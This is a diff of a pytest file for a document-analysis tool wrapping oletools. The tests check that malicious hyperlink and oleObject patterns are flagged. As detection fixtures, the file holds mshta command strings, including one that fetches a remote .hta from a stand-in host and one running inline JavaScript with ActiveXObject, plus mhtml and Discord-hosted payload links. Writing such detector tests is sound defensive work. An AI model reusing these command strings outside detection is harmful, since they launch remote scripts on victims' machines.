@@ -6,11 +6,10 @@ from oletools_.oletools_ import Oletools
 
 def test_get_oletools_version():
     ole = Oletools()
-    ole.start()
     assert ole.get_tool_version() == (
-            f"mraptor v{mraptor.__version__}, msodde v{msodde.__version__}, oleid v{oleid.__version__}, "
-            f"olevba v{olevba.__version__}, oleobj v{oleobj.__version__}, rtfobj v{rtfobj.__version__}"
-        )
+        f"mraptor v{mraptor.__version__}, msodde v{msodde.__version__}, oleid v{oleid.__version__}, "
+        f"olevba v{olevba.__version__}, oleobj v{oleobj.__version__}, rtfobj v{rtfobj.__version__}"
+    )
 
 
 def test_flag_macro():
@@ -39,40 +38,39 @@ def test_flag_macro():
 
 def test_parse_uri_empty():
     ole = Oletools()
-    ole.start()
     assert ole.parse_uri(b'') == ('', '', '')
 
 
 def test_parse_uri_file():
     ole = Oletools()
-    ole.start()
     assert ole.parse_uri(b'file://www.google.com') == ('', '', '')
 
 
 def test_parse_uri_safelist():
     ole = Oletools()
-    ole.start()
     assert ole.parse_uri(b'http://www.microsoft.com') == ('', '', '')
 
 
 def test_parse_uri_domain():
     ole = Oletools()
-    ole.start()
     assert ole.parse_uri(b'http://google.com') == ('http://google.com', 'network.static.domain', 'google.com')
 
 
 def test_parse_uri_ip():
     ole = Oletools()
-    ole.start()
     assert ole.parse_uri(b'https://8.8.8.8') == ('https://8.8.8.8', 'network.static.ip', '8.8.8.8')
 
 
 # -- _process_link
 
-def test_process_link_com_false_positive():
+@pytest.mark.parametrize('link', [
+    b'https://example.com',
+    b'https://example.com/username@email.com',
+    b'https://example.com/https%3A%2F%2Fexample.com%2Fhere%2Fis%2Fa%2Fnice%2Fpath',
+])
+def test_process_link_com_false_positive(link):
     ole = Oletools()
-    ole.start()
-    heur, _ = ole._process_link('hyperlink', b'https://google.com')
+    heur, _ = ole._process_link('hyperlink', link)
     assert heur.score == 0
 
 
@@ -99,7 +97,6 @@ def test_process_link_com_false_positive():
 ])
 def test_process_link_SyncAppvPublishingServer(link: str, heuristic: Heuristic, filename: str):
     ole = Oletools()
-    ole.start()
     heur, tags = ole._process_link('hyperlink', link)
     assert tags == {}
     assert heur.attack_ids == heuristic.attack_ids
@@ -109,7 +106,6 @@ def test_process_link_SyncAppvPublishingServer(link: str, heuristic: Heuristic, 
 
 def test_process_link_exclamation_false_positive():
     ole = Oletools()
-    ole.start()
     heur, _ = ole._process_link('hyperlink',
                                 R'https://domain.com/index.cfm?fuseaction='
                                 R'security.viewSILogon%20%20Login:%20username10%20Password:%20password1!')
@@ -118,7 +114,6 @@ def test_process_link_exclamation_false_positive():
 
 def test_process_link_exclamation_true_positive():
     ole = Oletools()
-    ole.start()
     heur, tags = ole._process_link('oleObject',
                                    R'https://cdn.discordapp.com/attachments/98'
                                    R'6484515985825795/986821210044264468/index.htm!')
@@ -129,7 +124,6 @@ def test_process_link_exclamation_true_positive():
 
 def test_process_link_mshta_script():
     ole = Oletools()
-    ole.start()
     heur, tags = ole._process_link('hyperlink', "mshta%20%22javascript:document.write();"
                                    "x=function(o)%7breturn%20new%20ActiveXObject(o)%7d;"
                                    "f=x('Scripting.FileSystemObject');%22%20%20")
@@ -140,7 +134,6 @@ def test_process_link_mshta_script():
 
 def test_process_link_mshta_link():
     ole = Oletools()
-    ole.start()
     heur, tags = ole._process_link('hyperlink', "mshta.exe http://link.to/malicious/page.hta")
     assert 'mshta' in heur.signatures
     assert 'T1218.005' in heur.attack_ids
@@ -149,7 +142,6 @@ def test_process_link_mshta_link():
 
 def test_process_mhtml_link_xusc():
     ole = Oletools()
-    ole.start()
     heur, tags = ole._process_link('oleObject', 'mhtml:https://first.link.com/!x-usc:https://second.link.com')
     assert 'mhtml_link' in heur.signatures
     assert 'https://second.link.com' in tags['network.static.uri']
@@ -157,7 +149,6 @@ def test_process_mhtml_link_xusc():
 
 def test_process_mhtml_link_exclamation():
     ole = Oletools()
-    ole.start()
     heur, tags = ole._process_link('oleObject', 'mhtml:https://first.link.com!https://second.link.com')
     assert 'mhtml_link' in heur.signatures
     assert 'https://first.link.com' in tags['network.static.uri']
